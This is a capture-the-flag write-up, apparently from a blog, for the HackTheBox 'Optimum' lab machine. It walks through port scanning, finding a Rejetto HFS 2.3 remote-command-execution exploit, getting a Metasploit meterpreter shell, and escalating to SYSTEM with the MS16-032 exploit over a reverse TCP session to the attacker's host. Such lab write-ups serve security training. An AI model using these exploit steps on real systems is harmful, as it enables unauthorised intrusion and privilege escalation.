@@ -1,0 +1,332 @@
+<blockquote>
+  <p>Optimum windows machine by HackTheBox.com</p>
+</blockquote>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>Find open ports</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre>
+<span class="nv">$ </span><span class="nb">sudo </span>masscan <span class="nt">-e</span> tun0 <span class="nt">-p0-65535</span> <span class="nt">--max-rate</span> 500 10.10.10.8
+
+Starting masscan 1.0.5 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2020-10-28 00:24:21 GMT
+ <span class="nt">--</span> forced options: <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--randomize-hosts</span> <span class="nt">-v</span> <span class="nt">--send-eth</span>
+Initiating SYN Stealth Scan
+Scanning 1 hosts <span class="o">[</span>65536 ports/host]
+Discovered open port 80/tcp on 10.10.10.8 
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>More enum with <code class="language-plaintext highlighter-rouge">nmap</code>:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p80</span> 10.10.10.8
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-10-28 08:37 AWST
+Nmap scan report <span class="k">for </span>optimum.htb <span class="o">(</span>10.10.10.8<span class="o">)</span>
+Host is up <span class="o">(</span>0.26s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    HttpFileServer httpd 2.3
+|_http-server-header: HFS 2.3
+|_http-title: HFS /
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>13.82 seconds
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Notice we have HFS 2.3 running. Let us <code class="language-plaintext highlighter-rouge">searchspoilt</code> for <code class="language-plaintext highlighter-rouge">HFS 2.3</code>:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>searchsploit <span class="s1">'HFS 2.3'</span>
+<span class="nt">-------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                 |  Path
+<span class="nt">-------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+HFS Http File Server 2.3m Build 300 - Buffer Overflow <span class="o">(</span>PoC<span class="o">)</span>                    | multiple/remote/48569.py
+Rejetto HTTP File Server <span class="o">(</span>HFS<span class="o">)</span> 2.2/2.3 - Arbitrary File Upload                 | multiple/remote/30850.txt
+Rejetto HTTP File Server <span class="o">(</span>HFS<span class="o">)</span> 2.3.x - Remote Command Execution <span class="o">(</span>1<span class="o">)</span>            | windows/remote/34668.txt
+Rejetto HTTP File Server <span class="o">(</span>HFS<span class="o">)</span> 2.3.x - Remote Command Execution <span class="o">(</span>2<span class="o">)</span>            | windows/remote/39161.py
+Rejetto HTTP File Server <span class="o">(</span>HFS<span class="o">)</span> 2.3a/2.3b/2.3c - Remote Command Execution       | windows/webapps/34852.txt
+<span class="nt">-------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Nice we have RCE for the Rejetto HFS 2.3.x!</p>
+
+<h2 id="exploit-rejetto">Exploit Rejetto</h2>
+
+<p>Time to load a <code class="language-plaintext highlighter-rouge">msfconsole</code> and see if we can find the RCE exploit. One way to search I found is using the inbuilt <code class="language-plaintext highlighter-rouge">grep</code> like this:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>msf5 <span class="o">&gt;</span> <span class="nb">grep </span>hfs search
+   140  exploit/windows/http/rejetto_hfs_exec                    2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
+
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>By setting just the <code class="language-plaintext highlighter-rouge">LHOST</code> and <code class="language-plaintext highlighter-rouge">RHOST</code> and running the exploit we get a windows shell:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td><td class="rouge-code"><pre><span class="o">&gt;</span> <span class="nb">ls
+</span>Listing: C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop
+<span class="o">================================</span>
+
+Mode              Size    Type  Last modified              Name
+<span class="nt">----</span>              <span class="nt">----</span>    <span class="nt">----</span>  <span class="nt">-------------</span>              <span class="nt">----</span>
+40777/rwxrwxrwx   0       <span class="nb">dir   </span>2020-11-03 17:58:59 +0800  %TEMP%
+100666/rw-rw-rw-  282     fil   2017-03-18 19:57:16 +0800  desktop.ini
+100777/rwxrwxrwx  760320  fil   2014-02-16 19:58:52 +0800  hfs.exe
+100444/r--r--r--  32      fil   2017-03-18 20:13:18 +0800  user.txt.txt
+
+meterpreter <span class="o">&gt;</span> <span class="nb">cat </span>user.txt.txt
+
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Following command is usefull to upgrade the shell <code class="language-plaintext highlighter-rouge">shell</code>. Press <code class="language-plaintext highlighter-rouge">CTRL+C</code> to back out of the upgraded shell.</p>
+
+<h2 id="privesc">PrivEsc</h2>
+
+<p>From here we can load some enumeration</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="o">[</span>1] background
+<span class="o">[</span>2] search suggest
+<span class="o">[</span>3] use post/multi/recon/local_exploit_suggester
+<span class="o">[</span>4] options
+<span class="o">[</span>5] <span class="nb">set </span>session 1
+<span class="o">[</span>6] run
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Lets see what it is vulnerable against:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td><td class="rouge-code"><pre>
+msf5 post<span class="o">(</span>multi/recon/local_exploit_suggester<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>session 1
+session <span class="o">=&gt;</span> 1
+msf5 post<span class="o">(</span>multi/recon/local_exploit_suggester<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.8 - Collecting <span class="nb">local </span>exploits <span class="k">for </span>x86/windows...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.8 - 34 exploit checks are being tried...
+<span class="o">[</span>+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+nil versions are discouraged and will be deprecated <span class="k">in </span>Rubygems 4
+<span class="o">[</span>+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Post module execution completed
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+</pre></td><td class="rouge-code"><pre>
+msf5 exploit<span class="o">(</span>windows/local/ms16_032_secondary_logon_handle_privesc<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>session 1
+session <span class="o">=&gt;</span> 1
+msf5 exploit<span class="o">(</span>windows/local/ms16_032_secondary_logon_handle_privesc<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST 10.10.14.26
+LHOST <span class="o">=&gt;</span> 10.10.14.26
+msf5 exploit<span class="o">(</span>windows/local/ms16_032_secondary_logon_handle_privesc<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LPORT 4443
+LPORT <span class="o">=&gt;</span> 4443
+msf5 exploit<span class="o">(</span>windows/local/ms16_032_secondary_logon_handle_privesc<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.26:4443 
+<span class="o">[</span>+] Compressed size: 1016
+<span class="o">[!]</span> Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Writing payload file, C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\s</span>vdgZGjdnpir.ps1...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Compressing script contents...
+<span class="o">[</span>+] Compressed size: 3596
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Executing exploit script...
+         __ __ ___ ___   ___     ___ ___ ___ 
+        |  V  |  _|_  | |  _|___|   |_  |_  |
+        |     |_  |_| |_| <span class="nb">.</span> |___| | |_  |  _|
+        |_|_|_|___|_____|___|   |___|___|___|
+                                            
+                       <span class="o">[</span>by b33f -&gt; @FuzzySec]
+
+<span class="o">[</span>?] Operating system core count: 2
+<span class="o">[&gt;]</span> Duplicating CreateProcessWithLogonW handle
+<span class="o">[</span>?] Done, using thread handle: 2108
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sniffing out privileged impersonation token..
+
+<span class="o">[</span>?] Thread belongs to: svchost
+<span class="o">[</span>+] Thread suspended
+<span class="o">[&gt;]</span> Wiping current impersonation token
+<span class="o">[&gt;]</span> Building SYSTEM impersonation token
+<span class="o">[</span>?] Success, open SYSTEM token handle: 2088
+<span class="o">[</span>+] Resuming thread..
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sniffing out SYSTEM shell..
+
+<span class="o">[&gt;]</span> Duplicating SYSTEM token
+<span class="o">[&gt;]</span> Starting token race
+<span class="o">[&gt;]</span> Starting process race
+<span class="o">[!]</span> Holy handle leak Batman, we have a SYSTEM shell!!
+
+lF6m5TQfuFviZtXSzwbgV9XLXQspfIqI
+<span class="o">[</span>+] Executed on target machine.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>176195 bytes<span class="o">)</span> to 10.10.10.8
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 2 opened <span class="o">(</span>10.10.14.26:4443 -&gt; 10.10.10.8:49167<span class="o">)</span> at 2020-10-28 09:03:18 +0800
+<span class="o">[</span>+] Deleted C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\s</span>vdgZGjdnpir.ps1
+
+meterpreter <span class="o">&gt;</span> shell
+Process 2784 created.
+Channel 1 created.
+Microsoft Windows <span class="o">[</span>Version 6.3.9600]
+<span class="o">(</span>c<span class="o">)</span> 2013 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt;net user
+net user
+
+User accounts <span class="k">for</span> <span class="se">\\</span>OPTIMUM
+
+<span class="nt">-------------------------------------------------------------------------------</span>
+Administrator            Guest                    kostas                   
+The <span class="nb">command </span>completed successfully.
+
+
+C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt;whoami
+<span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt;
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And we have privesc.</p>
+
+<p>Flag located at <code class="language-plaintext highlighter-rouge">C\Users\Administrator\Desktop</code>. BQ</p>
+
